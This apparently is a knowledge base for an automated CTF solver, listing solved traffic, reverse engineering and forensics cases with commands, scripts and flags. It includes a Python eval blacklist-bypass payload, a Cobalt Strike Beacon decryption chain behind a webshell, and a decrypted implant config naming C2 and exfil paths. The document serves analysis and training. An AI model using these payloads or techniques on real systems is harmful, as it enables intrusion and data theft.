Observed local case: `traffic-20260630-110523-key-pcapng/key.pcapng`.

Decisive evidence:

- `http.file_data` frame 105 decodes to `X@Yflag{This_is_a_f10g} [S] /var/www/html [E] X@Y`.
- HTTP object export writes a small `shell(3).php` response body with the same command output.
- The first failed ForgeFlag run decoded the string but did not promote `flag{This_is_a_f10g}` because the flag marker was adjacent to delimiter text; the regression now extracts embedded generic `flag{...}` / `f1ag{...}` markers and report paths prefer the latest direct candidate evidence over stale payload matches.

Solver lesson:

- TrafficSolver should scan decoded HTTP artifact text and exported object previews for embedded generic flag markers, not only boundary-separated platform prefixes.
- Replay reports should prefer findings whose `flag_candidates` directly contain the accepted flag when older runs also include the flag as incidental decoded payload text.

### Data URI Image In A Raw TCP Stream

Signal:

- PCAP has no normal HTTP objects, but `strings` reveals a long `data:image/jpg;base64,...` payload.
- Protocol hierarchy may be noisy or misleading, such as discovery traffic plus an unrelated industrial protocol stream.
- One TCP stream contains a single large printable payload rather than a full HTTP request or response.

Reproduction:

```bash
capinfos /Users/5haw0/Downloads/9.pcap
tshark -r /Users/5haw0/Downloads/9.pcap -q -z io,phs
tshark -r /Users/5haw0/Downloads/9.pcap -q -z conv,tcp
python3 scripts/solve_pcap9_data_image.py /Users/5haw0/Downloads/9.pcap
```

Observed case: `9.pcap`

- Capture: 5799 packets, 520 KB, about 112 seconds.
- Main protocol noise: Modbus/TCP between `192.168.99.79` and `192.168.99.31:502`, plus WS-Discovery/SSDP.
- Decisive carrier: raw TCP stream 2 from `192.168.99.79:25697` to `192.168.99.31:29793` starts with `data:image/jpg;base64,`.
- Decoded JPEG SHA-256:

```text
b11655f4bb764148c6057ab28046a75cc96ce9752566bd0fadccca0c91c00d3b
```

The extracted image visibly contains:

```text
flag{4eSyVERxvt70}
```

Solver lesson:

- TrafficSolver should search raw payload bytes for `data:image/` and other data URI carriers, not only HTTP object export.
- For visual flags, save the decoded artifact and record its hash. If OCR is unavailable, the write-up should still preserve the exact extraction path and visible text.

### IrisCTF 2024: Spicy Sines

Category:

- Traffic / radio-frequency image waveform.

Signal:

- The handout is a wide PNG waveform, not a packet capture.
- The prompt/category points to radio-frequency traffic and a public write-up identifies the modulation family as ASK/OOK with Manchester-style line coding.
- The blue trace has a measurable carrier period; the Manchester half-bit width is close to twice that period.

Shortest path:

```text
load spicy-sines.png as RGB pixels
extract the blue-dominant trace column by column
center the y trace and smooth squared amplitude into an envelope
estimate carrier period around 12 px
search Manchester half-bit widths near 2 * carrier_period and start offsets
decode low-high pairs as data bit 1, high-low pairs as data bit 0
recover irisctf{c0ngrats_y0uv3_d3feat3d_ook_th3_m0st_b4sic_f0rm_of_ask}
```

Solver lesson:

- TrafficSolver should not assume traffic means only PCAP. RF/radio CTF handouts can be image artifacts that still represent traffic bits.
- Preserve `rf_image_waveform` evidence with `carrier_period_pixels`, `half_bit_width`, `byte_aligned_start_offset`, `manchester_mapping`, and `flag_candidates`.
- Use carrier-period guided timing search instead of a fixed bit width; the real image needs a fine width near `23.95` pixels and fails at a rounded `24.00`.

### Laravel Webshell To Cobalt Strike Beacon Decryption

Signal:

- HTTP traffic shows Laravel Ignition probes such as `/_ignition/execute-solution/`, followed by a hidden PHP webshell path such as `/.config.php`.
- Webshell responses list project directories and suspicious archives, for example `secret/secret.zip`.
- A later host begins periodic scripted HTTP polling to a fixed path such as `/en_US/all.js`.
- Exported HTTP objects or webshell output reveal `.cobaltstrike.beacon_keys`.

Shortest path:

```bash
tshark -r capture.pcapng -q -z io,phs
tshark -r capture.pcapng -Y http.request \
  -T fields -E separator='|' \
  -e frame.number -e ip.src -e ip.dst -e tcp.stream \
  -e http.request.method -e http.host -e http.request.uri -e http.user_agent
tshark -r capture.pcapng -Y http.file_data -T fields -e http.file_data
python3 scripts/solve_traffic_1178.py challenge.zip
```

Observed chain for `traffic-1178`:

```text
192.168.132.130 -> 192.168.132.138  Nmap and Laravel Ignition probing
192.168.132.130 -> 192.168.132.138  POST /.config.php webshell traffic
192.168.132.138 -> 192.168.132.128  GET /en_US/all.js Beacon polling
```

The webshell listed `D:\phpstudy_pro\WWW\secret\secret.zip`, then ran:

```text
"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y
```

The extracted `.cobaltstrike.beacon_keys` is a Java serialized `KeyPair`. The private key contains a PKCS#8 DER blob beginning with ASN.1 marker `30 82 02 77`. Use it to decrypt the Beacon metadata cookie. The decrypted metadata begins with magic `00 00 be ef`; bytes 8-23 are the raw Beacon key.

The final solver script derives:

```text
raw Beacon key: b555de5dce3b9e3eb4b5722f6aa6bc85
AES key: SHA256(raw_key)[:16]
HMAC key: SHA256(raw_key)[16:]
metadata: DESKTOP-QQF0MLN | Administrator | beacon.exe
```

HTTP response bodies and result posts are AES-CBC with zero IV and a trailing 16-byte `HMAC-SHA256` prefix over the ciphertext. Decrypted client results show `D:\flag\flag.txt`. The directory listing reports `flag.txt` as 42 bytes. The type-output packet shows the UUID body and the four bytes immediately before it decode to `flag` via the packet's `mnop` XOR transform, giving the complete file contents:

```text
flag{787fc697-8773-4669-84ad-94f714e7df09}
```

Solver lesson:

- TrafficSolver should not stop at finding a webshell or C2 path. If a PCAP contains `.cobaltstrike.beacon_keys`, recover the Java serialized RSA key pair, decrypt the metadata cookie, derive AES/HMAC keys, and decrypt Beacon task/result packets.
- Webshell command reconstruction needs to handle prefixed Base64 form fields. If decoded bytes are shifted by a random prefix, try Base64 decoding from offsets 0-3 before assuming the command is encrypted.
- Reports should name the exploit chain, stream/path pivots, recovered Beacon identity, key material, and the decrypted packet that contains the flag.

### Internal Web App Pivot To Business Data

Signal:

- PCAP captures east-west traffic from a workstation to an internal web app.
- Requests use an internal host and nonstandard port, such as `nas-maritime-01.wabashmarine.local:8088`.
- The same service account and Basic Auth header appear across short HTTP sessions.
- Early endpoints reveal identity, index files, and business records rather than a direct exploit payload.

Shortest path:

```bash
tshark -r wabash_nas_pivot_2026-04-18.pcap -q -z conv,tcp
tshark -r wabash_nas_pivot_2026-04-18.pcap -q -z follow,tcp,ascii,0
tshark --export-objects http,out -r wabash_nas_pivot_2026-04-18.pcap
```

Observed chain:

```text
10.42.18.42:FIN-WS-07 -> 10.42.7.18:NAS-MARITIME-01:8088
GET /api/v1/sessions/whoami
GET /api/v1/dispatch/index
GET /api/v1/dispatch/dispatch_2026-04-18.txt
GET /api/v1/personnel/index
GET /api/v1/personnel/crew_manifests_q2_2026.csv
```

The dispatch identified vessel `WAB-2207`. The Q2 crew manifest row for that vessel's `Master` contained a Base64 value in the `notes` field:

```text
U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==
```

Decoded flag:

```text
SVIUSCG{wabash_finws_pivot_nas_maritime_01}
```

Solver lesson:

- TrafficSolver should reconstruct HTTP object chains and preserve the business clue that caused each next request.
- For CSV/JSON HTTP objects, parse fields and apply transforms to suspicious cells such as `notes`, `comment`, `metadata`, `token`, and `payload`.
- Write-ups for pivot captures should name source, destination, account, endpoint sequence, and the exact field that carried the flag.

### Beacon Host Mismatch And Reused XOR

Signal:

- HTTP capture is mostly normal browsing, but one host has scripted User-Agent traffic, regular polling, and repeated API paths.
- The Host header looks like CDN or telemetry infrastructure, while the destination IP belongs to an unrelated ASN or country.
- Form bodies carry Base64 fields such as `cfg` or `data`; decoded blobs share a long identical prefix.

Reproduction strategy:

```bash
tshark -r capture.pcap -Y http.request \
  -T fields -e frame.number -e ip.src -e ip.dst -e http.host -e http.request.method -e http.request.uri -e http.user_agent
tshark -r capture.pcap \
  -Y 'http.request && http.host == "suspicious.example" && http.file_data' \
  -T fields -e frame.number -e http.request.uri -e http.file_data
```

Then:

- Decode URL-form bodies and Base64 values without converting `+` into spaces.
- Crib common JSON prefixes such as `{"id":"...` against identical ciphertext prefixes. In the SAR-style finance beacon case, this recovered the repeating XOR key `Ar3s_C2!`.
- Decrypt config/result records, then compare declared C2/stage hosts with the actual IP's WHOIS or GeoIP result.
- For Around-the-World style answers, use the real destination country/city rather than the claimed CDN or region string.

Solver lesson:

- TrafficSolver should group HTTP requests by `(host, dst_ip, user_agent)`, score periodic scripted beacons separately from browser traffic, and try known-plaintext repeating-XOR on Base64 form fields with shared prefixes.
- GeoIP/WHOIS evidence should be recorded as a first-class finding when the challenge clue asks where traffic really goes.

Observed case: `portion2.pcap`

The capture was about two hours of outbound web traffic from `10.10.13.37`. Most browser traffic used a Chrome user-agent, but one destination dominated scripted polling:

```text
10.10.13.37 -> 185.93.187.42
Host: telemetry-edge-eu.cdnflare-stat.net
User-Agent: python-requests/2.25.1
Paths: /api/5f3a9c11d4e84b2a/hello, /api/5f3a9c11d4e84b2a/idle, /api/5f3a9c11d4e84b2a/result
```

Shortest path:

```bash
tshark -r portion2.pcap -Y http.request \
  -T fields -E separator=$'\t' \
  -e frame.number -e frame.time_relative -e ip.src -e ip.dst \
  -e http.host -e http.request.method -e http.request.uri -e http.user_agent

tshark -r portion2.pcap \
  -Y 'http.host == "telemetry-edge-eu.cdnflare-stat.net" && http.request.method == "POST"' \
  -T fields -E separator=$'\t' \
  -e frame.number -e tcp.stream -e http.request.uri -e http.file_data
```

Decode the form body manually so Base64 `+` characters are not converted to spaces. The `cfg` and `data` values Base64-decode to ciphertexts with an identical prefix. Cribbing the first blob against `{"id":"5f3a9c11d4e84b2a"` recovers the repeating XOR key:

```text
Ar3s_C2!
```

Decrypting with that key gives the implant configuration:

```json
{
  "id": "5f3a9c11d4e84b2a",
  "campaign": "RAVENGLASS",
  "host": "WIN-DSK-FIN03",
  "user": "j.dvorak",
  "os": "Windows 10.0.19045",
  "c2": "http://ctfchallenge.on-forge.com",
  "port": 80,
  "task_path": "/api/v2/tasks",
  "exfil_path": "/api/v2/upload",
  "interval": 60,
  "jitter": 0.25,
  "stage": "http://http://ctfchallenge.on-forge.com:80/update/manifest.json",
  "note": "key reused for stage manifest"
}
```

The short result posts decrypt to idle/ok records such as:

```json
{"id":"5f3a9c11d4e84b2a","r":"idle"}
{"id":"5f3a9c11d4e84b2a","r":"ok"}
```

There is no embedded `SVI...{...}` string in the capture or exported HTTP objects. The answer evidence is the mismatch itself: the implant claims `ctfchallenge.on-forge.com`, while the observed traffic is to `185.93.187.42` with Host `telemetry-edge-eu.cdnflare-stat.net`. WHOIS/GeoIP identify the real destination as `AS44863 STARNET TC LLC`, `UA`, Kharkiv/Berestyn area.

Likely submit values for CTF platforms that wrap derived answers in a flag:

```text
SVIUSCG{kharkiv_ukraine}
SVIUSCG{berestyn_ukraine}
SVIUSCG{ravenglass_kharkiv_ukraine}
```

Solver lesson:

- When a traffic challenge asks where the host is "really" talking, prioritize the actual destination IP and ASN/GeoIP over the HTTP Host, DNS name, or decrypted configuration's declared C2.
- Do not stop at identifying the noisy domain; decrypt the beacon config to recover campaign, infected host, user, declared C2, and staging path.
- Record whether the flag was directly embedded or inferred from the IOC question so the UI can display confidence and candidate submissions separately.

## Reverse Cases

### Custom TCP Payload Reassembly Into Source

Signal:

- Generator source says packets are `[magic][seq][len][payload]`.
- Valid packets have magic `ZN` and payload beginning with the sequence ID.
- Source was split by stride: `chunks = [code[i::num_strides] for i in range(num_strides)]`.

Reproduction:

```python
raw = bytes.fromhex(open("output.txt").read().strip())
packets = []
i = 0
while i < len(raw):
    magic, seq, ln = raw[i:i+2], raw[i+2], raw[i+3]
    payload = raw[i+4:i+4+ln]
    if magic == b"ZN" and payload.startswith(str(seq).encode()):
        packets.append((seq, payload[1:].decode()))
    i += 4 + ln

chunks = dict(packets)
code = "".join(chunks[i][j] for j in range(max(map(len, chunks.values()))) for i in range(5) if j < len(chunks[i]))
print(code)
```

Solver lesson:

- ReverseSolver should parse explicit protocol annotations from source and output files before trying decompilation.
- If recovered source contains byte arrays plus XOR keys, emit a direct decode script.

### Word Mapping Esolang

Signal:

- Source maps ASCII codes to slang words, for example `sigma rule 83: yapping("hawk")`.
- Output is a word list.

Reproduction:

```python
import re
rules = open("message.txt").read()
word_to_code = {word: int(code) for code, word in re.findall(r'sigma rule\s+(\d+):\s+yapping\("([^"]*)"\)', rules)}
words = open("output.txt").read().split()
print("".join(chr(word_to_code[word]) for word in words))
```

Solver lesson:

- ReverseSolver should recognize dispatch tables and switch cases that print strings for character codes.
- Treat odd "programming languages" as encoders first; build a reverse dictionary.

### Stripped ELF Phrase Recovery

Signal:

- Stripped Linux ELF asks for an override phrase.
- Strings show prompts and a few suspicious encoded byte strings.

Reproduction strategy:

- Run `strings` to identify success/failure prompts.
- Disassemble around `strlen`, compare loops, or encoded constants.
- Look for XOR/add/sub tables in `.rodata`.
- Reconstruct the expected phrase with a Python script rather than brute forcing. For a check like `((input[i] ^ 0x13) + i) & 0xff == table[i]`, invert each byte as `input[i] = ((table[i] - i) & 0xff) ^ 0x13`.
- Verify statically by reapplying the recovered formula to the candidate phrase; dynamic execution is optional when the host architecture or container image is unavailable.

Observed case: `beacon_override`

```bash
file beacon_override
strings -a beacon_override
objdump -d -M intel beacon_override
objdump -s -j .rodata beacon_override
```

The useful path was fully static:

- Stripped dynamically linked x86-64 ELF.
- `readelf` was unavailable, so `objdump` was the reliable fallback.
- The helper at `0x4011d2` required exactly `0x17` bytes.
- Each byte was checked as `((input[i] ^ 0x13) + i) & 0xff` against a 23-byte table at `.rodata:0x402130`.

Recovered phrase:

```text
SVIBGR{b3ac0n_0v3rr1d3}
```

Solver lesson:

- ReverseSolver should pair prompt strings with nearby validation logic in disassembly.
- ReverseSolver should emit the inverse byte formula, `.rodata` table bytes, and recovered phrase in the write-up.
- IDA/Ghidra MCP should be the next tool when symbols are stripped and the compare loop is not clear from linear disassembly.

### Self-Decrypting Bytecode VM With S-Box Constraints

Signal:

- ELF is stripped, statically linked, and has very small `.text`.
- `.rodata` begins with a jump table and contains a 256-byte substitution table plus short `yes`/`no` strings.
- `.data` looks like bytecode rather than normal initialized data.
- VM dispatch reads opcodes from `.data`, stores input in `.bss`, and includes an opcode that XOR-decrypts following bytecode with a state byte derived from prior input.

Reproduction strategy:

- Reconstruct the VM opcode semantics from the jump table handlers.
- Emulate the bytecode, but treat self-decrypting opcodes as phase boundaries.
- Solve early state-updating checks concretely when each block pins one input byte and rolls the VM state through the S-box.
- After decrypting later phases, translate check-only blocks into constraints. For 4-byte S-box relations, a small CSP over the flag charset can be faster than generic SMT.
- Verify the recovered input with a VM emulator when the host cannot execute the Linux ELF directly.

Solved sample:

```text
SVIUSCG{by3_buddy_h0p3_yu0_f1nd_y0ur_d4d}
```

Solver lesson:

- Do not linear-disassemble encrypted VM bytecode; the correct opcode stream may depend on runtime state.
- Structural decoding keys that reach an early success can be decoys if they do not match the VM state computed from input.
- Keep the final solve script self-contained: parse sections, emulate enough VM to recover/decrypt phases, solve constraints, and verify by re-running the VM semantics.

### Packed Or UPX-Marked Binary

Signal:

- `strings` or section names mention `UPX`.
- Normal strings/decompilation are sparse or misleading.

Reproduction strategy:

```bash
file binary
strings -a binary | rg -i "upx|packed"
upx -d binary -o unpacked  # only on a copy
```

Solver lesson:

- ReverseSolver should detect packer indicators and record the next safe step before treating missing strings as a dead end.

## Forensics And Misc Cases

### HTB Cyber Apocalypse 2024: [Easy] Unbreakable

Category:

- Misc / Python eval blacklist bypass.

Signal:

- Source appends `()` to user input and evaluates it with `eval(ans + '()')`.
- A substring blacklist blocks shell-looking tokens, digits, braces, underscores, spaces, `import`, `eval`, `os`, and the letters `b` / `s`.
- The filter still allows `print`, `open`, `read`, single quotes, comma, dot, parentheses, and `#`.
- The public handout is source-only and does not include the remote `flag.txt`.

Shortest replay path:

```text
parse the source blacklist
build print(open('flag.txt','r').read())#
verify the payload contains no blocked substring
run the source locally with a challenge-scoped flag.txt fixture
recover HTB{3v4l_0r_3vuln??}
```

Solver lesson:

- When a challenge appends syntax after user input, look for comment or string-literal termination before trying heavier Python introspection.
- Source-only replays should say when a local `flag.txt` fixture is injected because the remote flag file was not shipped; that proves the payload path, not independent flag discovery from the attachment.
- Preserve `blacklist_safe`, payload text, and the exact source line shape as replay evidence.

### NUS Greyhats Welcome CTF 2024: EE2026

Category:

- Misc / FPGA reverse engineering.

Signal:

- The handout is a Vivado project ZIP plus an assignment PDF for a Basys3 seven-segment task.
- The original HDL source is missing, but `graded_post_lab_assignment_1.runs/synth_1/main.dcp` is a ZIP checkpoint containing `main.edf`.
- The EDIF netlist is tiny: two `LUT5` instances, one `LUT6`, switch input buffers, LED outputs, seven-segment outputs, and anodes.

Shortest replay path:

```text
extract main.dcp from graded_post_lab_assignment_1.zip
open main.dcp as Zip and read main.edf
parse LUT INIT values 32'h00000008, 32'hFEFFFFFF, 64'h0010000000000000
enumerate SW0..SW9 until LD15 is high -> SW1,SW2,SW4,SW8 -> 1248X
map active-low segment/anode outputs through the assignment table -> A=2, B=G, C=8
recover grey{21248xG8}
```

Solver lesson:

- Vivado `.dcp` checkpoints can be ordinary ZIP containers; try archive extraction before assuming proprietary tooling is required.
- For small combinational netlists, parse EDIF `net` joins and LUT `INIT` values, then simulate the graph instead of relying on GUI schematic inspection.
- Preserve the recovered switch set, LUT INITs, active-low display mapping, and final student ID as replay evidence.

### Truncated ZIP With Missing EOCD

Signal:

- `file` identifies a ZIP archive, but `zipinfo` or `unzip -l` reports "End-of-central-directory signature not found".
- Hex view still shows local file headers such as `PK\x03\x04`, filenames, compressed sizes, uncompressed sizes, and CRC fields.

Reproduction:

```python
import binascii
import struct
import zlib

data = open("archive.zip", "rb").read()
offset = 0
while True:
    start = data.find(b"PK\x03\x04", offset)
    if start < 0:
        break
    _, _, _, method, _, _, crc, csize, usize, nlen, xlen = struct.unpack_from("<IHHHHHIIIHH", data, start)
    name = data[start + 30 : start + 30 + nlen].decode()
    body_start = start + 30 + nlen + xlen
    body = data[body_start : body_start + csize]
    plain = zlib.decompress(body, -15) if method == 8 else body
    assert len(plain) == usize
    assert (binascii.crc32(plain) & 0xFFFFFFFF) == crc
    print(name, plain)
    offset = body_start + csize
```

Solver lesson:

- ForensicsSolver should recover local ZIP entries even when the central directory or EOCD is missing.
- The report should preserve the recovered filenames, CRC check result, and any decoded tag or flag from recovered text.

### Chrome Profile History Leak URL

Signal:

- Windows user profile extract contains Chrome `User Data/Default/History`, `Bookmarks`, `Cookies`, `Login Data`, and PowerShell PSReadLine.
- The statement gives a suspected leak date and user, but the profile has no obvious desktop/downloaded payload.
- Chrome History contains a late or suspicious external URL, often with query parameters such as `tag`, `payload`, `data`, `token`, or `src`.
- The suspicious parameter is Base64 or another transform-friendly encoding.

Shortest path:

```bash
unzip OSPREY-WS-042_plandau_extract.zip -d extract
sqlite3 -header -column \
  extract/Users/plandau/AppData/Local/Google/Chrome/'User Data'/Default/History \
  "select datetime((last_visit_time/1000000)-11644473600,'unixepoch') as t,
          visit_count, typed_count, url, title
   from urls order by last_visit_time;"
```

In the Osprey profile case, the suspicious URL was an external paste mirror upload:

```text
https://paste-mirror-q4.example.invalid/upload?tag=U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9&src=oc
```

Decode the `tag` parameter:

```bash
printf '%s' 'U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9' | base64 -d
```

Flag:

```text
SVIUSCG{osprey_chrome_history_leak_url}
```

Solver lesson:

- ForensicsSolver should parse Chrome History timestamps with the WebKit epoch conversion.
- Browser profile triage should scan URL query parameters and form-like fields with transform candidates, not only page titles.
- The write-up should preserve the suspicious timestamp, URL host/path, query parameter name, and exact decoder.

### Full-Size JPEG Thumbnail Reveal

Signal:

- `exiftool` shows `Thumbnail Image` data even when GPS/comment metadata is empty.
- The thumbnail has the same dimensions as the main JPEG, or looks suspiciously large for a normal camera thumbnail.
- The visible main image has a natural obstruction, blur, crack, or overlay that may hide text.

Reproduction:

```bash
exiftool -b -ThumbnailImage challenge.jpg > thumb.jpg
file thumb.jpg
```

If the thumbnail does not immediately reveal the text, compare it with the main image:

```python
from PIL import Image, ImageChops, ImageOps

main = Image.open("challenge.jpg").convert("RGB")
thumb = Image.open("thumb.jpg").convert("RGB")
diff = ImageOps.autocontrast(ImageChops.difference(main, thumb))
diff.save("thumbnail_diff.png")
```

Solver lesson:

- ForensicsSolver should extract embedded JPEG thumbnails and scan/render them as separate images.
- When main and thumbnail dimensions match, generate a difference preview because the thumbnail may contain an earlier or edited image layer with the flag still visible.

### Linux Injector Anonymous VMA Cache

Signal:

- A Linux memory snapshot and matching Volatility3 ISF/symbol file are provided.
- The suspicious process has a dull command line, no useful environment variables, and no meaningful open files or sockets.
- `linux.proc.Maps` shows an anonymous `rwx` mapping or other small anonymous region in that process.

Reproduction:

```bash
zstd -d stonehaven_hp_dump.raw.zst -o dump.raw
mkdir -p symbols/linux
gzip -cd linux-debian-6.1.0-42.json.gz > symbols/linux/linux-debian-6.1.0-42.json

vol -f dump.raw -s symbols linux.pslist.PsList
vol -q -f dump.raw -s symbols linux.psaux.PsAux | rg mal_inject
vol -q -f dump.raw -s symbols linux.envars.Envars --pid 82
vol -q -f dump.raw -s symbols linux.lsof.Lsof --pid 82
vol -q -f dump.raw -s symbols linux.proc.Maps --pid 82
vol -q -f dump.raw -s symbols -o dumps linux.proc.Maps --pid 82 --dump --address 0x7f1bbcb8c000
strings -a -n 4 dumps/pid.82.vma.0x7f1bbcb8c000-0x7f1bbcb8d000.dmp
```

In the solved sample, the `rwx` anonymous page contained a Base64 flag:

```text
U1ZJVVNDR3tzdG9uZWhhdmVuX2dsYXNzX2hlcm9uX3N0Z185ZjFhMzN9
SVIUSCG{stonehaven_glass_heron_stg_9f1a33}
```

Solver lesson:

- For Linux memory cases, confirm the kernel banner and symbol match before deeper plugins.
- Treat clean `psaux`, `envars`, `lsof`, and socket output as a clue to inspect VMA contents rather than as a dead end.
- Small anonymous `rwx` pages are high-signal; dump them first, then scan heap and stack if needed.

### Windows REG NetworkList WiFi Name

Signal:

- Artifact is a Windows Registry export (`.reg`) in UTF-16LE.
- Challenge asks for the Wi-Fi name used by a host.
- `NetworkList` has both generic profile names and a specific `Nla\\Wireless` key.

Reproduction:

```bash
file /Users/5haw0/Downloads/zhucebiao.reg
iconv -f UTF-16LE -t UTF-8 /Users/5haw0/Downloads/zhucebiao.reg \
  | sed -n '539760,539820p'
python3 scripts/solve_zhucebiao_wifi.py /Users/5haw0/Downloads/zhucebiao.reg
```

Observed case: `zhucebiao.reg`

- `NetworkList\\Nla\\Wireless` default value:

```text
4F50504F2052656E6F
```

- Hex-decoding this UTF-8 string gives:

```text
OPPO Reno
```

- The same value appears under `NetworkList\\Profiles` as `ProfileName` and `Description`.
- The challenge asked for no spaces inside `flag{}`, so the submitted flag is:

```text
flag{OPPOReno}
```

Solver lesson:

- In Windows registry exports, `NetworkList\\Profiles` may include generic names such as `网络`; prefer `NetworkList\\Nla\\Wireless` when the task specifically asks for Wi-Fi SSID.
- SSID values may be hex-encoded in registry key values. Decode hex to UTF-8/ASCII before formatting the flag.

### JPEG-Appended Nintendo DS ROM Bitmap Text

Signal:

- `file` reports a normal JPEG, but the physical file continues well past the JPEG EOI marker `ff d9`.
- `strings` near the trailer shows a console-style title or game code, such as `USCG CTF` / `USCG01`.
- Carving from the trailer yields a valid Nintendo DS ROM image.

Reproduction:

```python
from pathlib import Path

data = Path("nintendo-ds.jpg").read_bytes()
eoi = data.index(b"\xff\xd9") + 2
tail = data[eoi:]
nds_start = tail.index(b"USCG CTF")
rom = tail[nds_start:]
Path("carved.nds").write_bytes(rom)
```

Then parse the NDS header to carve ARM9 code and reconstruct framebuffer writes:

```python
from pathlib import Path

rom = Path("carved.nds").read_bytes()
arm9_off = int.from_bytes(rom[0x20:0x24], "little")
arm9_size = int.from_bytes(rom[0x2c:0x30], "little")
arm9 = rom[arm9_off:arm9_off + arm9_size]

points = []
pos = 0
for i in range(4, len(arm9) - 4, 4):
    if arm9[i:i + 4] == bytes.fromhex("b060c3e1") and arm9[i - 3:i] == bytes.fromhex("3083e2"):
        pos += arm9[i - 4]
        points.append(pos // 2)
```

Render those points at a 256-pixel NDS screen width and split the first five rows into 4x5 bitmap glyphs. In the solved sample, the rendered text was:

```text
SVIUSCG{WHICH_EMULATOR_DID_YOU_USE?}
```

Solver lesson:

- Image forensics should report exact EOI and trailer offsets, then run `file`/`strings` on carved trailers.
- If a trailer is a ROM or firmware image, switch from stego extraction to format-aware reverse triage.
- ReverseSolver should recognize repeated `add pointer, immediate; store halfword` patterns as framebuffer drawing and generate a small renderer over likely screen widths such as 256 for Nintendo DS.

### JPEG COM Base64 Flag

Signal:

- JPEG has a comment marker (`COM`) or metadata field containing Base64-looking text.
- Direct flag scan fails because the flag appears only after decoding.

Reproduction:

```bash
exiftool image.jpg
strings -n 4 image.jpg
printf '%s' 'BASE64_TEXT' | base64 -d
```

Solver lesson:

- ForensicsSolver and MiscSolver should run transform candidates over image metadata, comments, text chunks, and trailing data.
- Write-up must say "found encoded text in JPEG COM comment, decoded with base64", not "strings directly showed the flag".

### PNG IHDR Height Repair

Signal:

- PNG viewer fails or image appears truncated.
- IHDR declared height does not match IDAT-derived scanline count, or CRC is wrong.

Reproduction strategy:

```bash
pngcheck image.png
python3 repair_ihdr_height.py image.png repaired.png
```

Solver lesson:

- MiscSolver and ForensicsSolver should compute plausible derived dimensions and write a repaired artifact path.

### PNG LSB Extraction

Signal:

- PNG appears normal but statement hints at hidden image data.
- LSB scan over RGB channels yields printable text or encoded entities.

Reproduction strategy:

- Try bit plane 1 first.
- Try RGB/RGBA channel orders and row-major traversal.
- Decode extracted text again if it is HTML entities, URL encoding, or Base64.

Solver lesson:

- Image evidence should record recipe details such as `b1,rgb,lsb,xy` so the write-up can be reproduced.

### BMP QuickStego Plus Braille ASCII

Signal:

- BMP header is clean: no appended data, no metadata, and pixel data ends exactly at EOF.
- `zsteg` reports noisy LSB candidates, repeated filler characters, or false file signatures but no stable flag.
- Statement hints at Windows tooling, blindness, light, closed eyes, or opening windows.

Reproduction:

```bash
file /Users/5haw0/Downloads/coolguy.bmp
/Users/5haw0/.gem/ruby/2.6.0/bin/zsteg /Users/5haw0/Downloads/coolguy.bmp
# QuickStego on Windows reveals:
# 2471491ED07C69930E8F994E383E415F
python3 scripts/solve_coolguy_bmp.py /Users/5haw0/Downloads/coolguy.bmp
```

In the solved `coolguy.bmp` / `In Your Eyes` sample, QuickStego recovered:

```text
2471491ED07C69930E8F994E383E415F
```

Converting the hex to binary without left-zero padding and splitting into 6-bit Braille ASCII cells yields:

```text
CSICTF_<UCBR#DILL#C.)
```

Read the Braille semantics rather than raw ASCII: `_<` is `{`, `.)` is `}`, and numeric indicator `#` turns `D`/`C` into `4`/`3`.

Flag:

```text
csictf{ucbr4ill3}
```

Solver lesson:

- When an image stego prompt says "Windows tool" and Linux LSB tools only produce filler/noise, test QuickStego or an equivalent extractor before overfitting bit-plane artifacts.
- Braille CTF answers may use Braille ASCII as an intermediate. Preserve both the raw Braille ASCII text and the semantic normalization step in the write-up.

### 1-Bit Visual-Cryptography Shares

Signal:

- Two or more PNGs look like balanced black/white or gray noise.
- `file` reports 1-bit grayscale, or pixel counts are exactly or nearly 50/50.
- The statement says a cipher is hidden "in these images" rather than in metadata.

Reproduction:

```python
from pathlib import Path
from PIL import Image

img1 = Image.open("Battle1.png").convert("1")
img2 = Image.open("Battle2.png").convert("1")
revealed = bytes(a ^ b for a, b in zip(img1.tobytes(), img2.tobytes()))
Image.frombytes("1", img1.size, revealed).save("revealed.png")
```

In the solved Battle sample, XOR revealed a Roman battle scene with `SPQR`, the ciphertext:

```text
XFOK XKEK XKDK
```

and the instruction:

```text
Decipher the encrypted text and write the name of the author of the quotation in ALL CAPITAL LETTERS
```

The Roman context and 4-4-4 quote structure identify the quotation as `VENI VIDI VICI`; the author is `JULIUS CAESAR`.

Solver lesson:

- For noise-like 1-bit image pairs, try pixel XOR/equality/difference before metadata-heavy stego.
- Save a rendered reveal artifact for manual reading; OCR may not be available or reliable on dithered text.
- Treat visible themed art and instruction text as part of the cipher evidence, not just decoration.

### Extra Or Independent PNG IDAT Payload

Signal:

- PNG has extra compressed chunks or zlib-looking data after the normal image stream.
- `binwalk` may not explain the payload.

Reproduction strategy:

- Parse PNG chunks.
- Try each independent IDAT/zlib stream with `zlib.decompress`.
- Scan decompressed text with transform candidates.

Solver lesson:

- ForensicsSolver should continue after normal PNG parsing and test independent compressed streams.

### Magic Extension Mismatch

Signal:

- Filename says `.jpg`, but magic bytes say PNG, ZIP, gzip, or another container.

Reproduction:

```bash
file artifact
xxd -l 16 artifact
```

Solver lesson:

- Solver routing should follow detected content, not extension. Reports should explicitly mention the mismatch.

### Krita Project Masquerading As ZIP

Signal:

- File extension is `.zip`, but `mimetype` inside says `application/x-krita`.
- Archive contains `maindoc.xml`, `mergedimage.png`, and `*.shapelayer/content.svg`.
- Hidden vector layers each contain one text character.

Reproduction:

```bash
unzip challenge.zip -d out
cat out/mimetype
find out -path '*shapelayer/content.svg' -print
```

Parse the SVG text nodes and sort by x coordinate:

```python
from pathlib import Path
import html, re

items = []
for path in Path("out").glob("**/*.shapelayer/content.svg"):
    text = path.read_text()
    m = re.search(r'<text[^>]*transform="([^"]+)"[^>]*>(.*?)</text>', text, re.S)
    if not m:
        continue
    nums = [float(x) for x in re.findall(r'-?\d+(?:\.\d+)?', m.group(1))]
    x = nums[-2] if m.group(1).startswith("matrix") else nums[0]
    ch = html.unescape(re.sub(r"<.*?>", "", m.group(2)).strip())
    items.append((x, ch))
print("".join(ch for _, ch in sorted(items)))
```

Solver lesson:

- MiscSolver should inspect ZIP `mimetype` entries for OpenDocument/Krita-like containers.
- SVG text extraction and coordinate sorting should be a reusable image/document subroutine.

### Pickle Sandbox Pattern

